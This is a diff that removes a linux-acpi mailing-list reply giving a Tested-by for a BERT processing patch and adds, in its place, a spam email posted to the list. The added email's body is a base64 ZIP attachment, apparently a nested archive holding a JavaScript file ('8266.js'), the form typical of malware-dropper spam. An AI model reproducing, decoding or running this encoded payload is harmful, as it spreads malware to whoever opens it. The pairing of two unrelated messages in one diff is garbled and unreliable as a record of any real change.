@@ -1,65 +1,69 @@
-From: "Baicar, Tyler" <tbaicar@codeaurora.org>
-Subject: Re: [PATCH v3] ACPI / APEI: Boot Error Record Table processing was
- needlessly complicated
-Date: Fri, 19 May 2017 15:39:29 -0600
-Message-ID: <276be033-dcbb-bff3-fa52-9a84a57a9d2e@codeaurora.org>
-References: <5174133f-2588-eda1-4f98-0e457f16af0d@codeaurora.org>
- <20170516225806.5702-1-tony.luck@intel.com>
+From: <ecaterinasuciu09@yahoo.com>
+Subject: (unknown)
+Date: Sat, 20 May 2017 08:14:06 -0000
+Message-ID: <149526804613.1559.13982538043165984949@nsg-static-126.81.75.182-airtel.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="0482411662588.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from smtp.codeaurora.org ([198.145.29.96]:38846 "EHLO
-        smtp.codeaurora.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1756170AbdESVjg (ORCPT
-        <rfc822;linux-acpi@vger.kernel.org>); Fri, 19 May 2017 17:39:36 -0400
-In-Reply-To: <20170516225806.5702-1-tony.luck@intel.com>
-Content-Language: en-US
+Received: from nsg-static-126.81.75.182-airtel.com ([182.75.81.126]:4576 "HELO
+        nsg-static-126.81.75.182-airtel.com" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1753045AbdETIOZ (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>);
+        Sat, 20 May 2017 04:14:25 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: "Luck, Tony" <tony.luck@intel.com>, "Rafael J. Wysocki" <rjw@rjwysocki.net>
-Cc: Len Brown <lenb@kernel.org>, Huang Ying <ying.huang@intel.com>, Borislav Petkov <bp@suse.de>, Tomasz Nowicki <tomasz.nowicki@linaro.org>, Jonathan Zhang <zjzhang@codeaurora.org>, linux-acpi@vger.kernel.org
+To: linux-acpi@vger.kernel.org
 
-On 5/16/2017 4:58 PM, Luck, Tony wrote:
-> From: Tony Luck <tony.luck@intel.com>
->
-> Quoting version 6.1 of the ACPI specification. Section 18.3.1 "Boot
-> Error Source" says:
->
->    The Boot Error Region is a range of addressable memory OSPM can access
->    during initialization to determine if an unhandled error condition
->    occurred. System firmware must report this memory range as firmware
->    reserved. The format of the Boot Error Region follow that of an Error
->    Status Block, this is defined in Section 18.3.2.7. The format of the
->    error status block is described by Table 18-342.
->
-> This clarifies some points that were obfuscated in earlier versions.
-> E.g. there is no longer a separate table to describe the format of the
-> "Boot Error Region" (which was identical to the "Error Status Block").
-> Also saying "follow that of *an* Error Status Block" makes it clear that
-> there is just one block (which can still contain multiple "Generic Error
-> Data Entry structures").
->
-> The loop inside bert_print_all() is unnecessary (but probably harmless
-> as the "while (remain > sizeof(struct acpi_bert_region))" loop should
-> terminate after we skipped over the first entry.
->
-> We can drop the "bert_print_all()" function and just move the four
-> relevant lines inline in "bert_init()".
->
-> Cc: Len Brown <lenb@kernel.org>
-> Cc: Huang Ying <ying.huang@intel.com>
-> Cc: Borislav Petkov <bp@suse.de>
-> Cc: Tomasz Nowicki <tomasz.nowicki@linaro.org>
-> Cc: Jonathan (Zhixiong) Zhang <zjzhang@codeaurora.org>
-> Cc: Tyler Baicar <tbaicar@codeaurora.org>
-> Cc: linux-acpi@vger.kernel.org
-> Reviewed-by: Borislav Petkov <bp@suse.de>
-> Signed-off-by: Tony Luck <tony.luck@intel.com>
-Tested-by: Tyler Baicar <tbaicar@codeaurora.org>
-
--- 
-Qualcomm Datacenter Technologies, Inc. as an affiliate of Qualcomm Technologies, Inc.
-Qualcomm Technologies, Inc. is a member of the Code Aurora Forum,
-a Linux Foundation Collaborative Project.
-
+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
